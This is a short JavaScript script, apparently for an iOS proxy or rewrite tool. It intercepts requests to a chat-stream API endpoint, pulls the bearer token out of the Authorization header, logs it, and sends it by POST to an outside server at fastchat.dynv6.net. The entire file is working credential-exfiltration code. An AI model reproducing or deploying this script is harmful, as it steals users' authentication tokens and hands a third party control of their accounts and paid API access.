
const url = 'https://api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app';

if ($request && $request.url.match(url)) {
    const authorizationHeader = $request.headers['authorization'];
    const bearerToken = authorizationHeader.split(' ')[1];

    if (bearerToken) {
        console.log(`Bearer Token: ${bearerToken}`);
        const saveTokenRequest = {
            url: 'http://fastchat.dynv6.net:8300/save-token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ token: bearerToken })
        };

        $task.fetch(saveTokenRequest).then(response => {
            console.log('Token saved response: ' + response.body);
        }, reason => {
            console.log('Error saving token: ' + reason.error);
        });
    } else {
        console.log("Bearer token not found.");
    }
}

$done({});
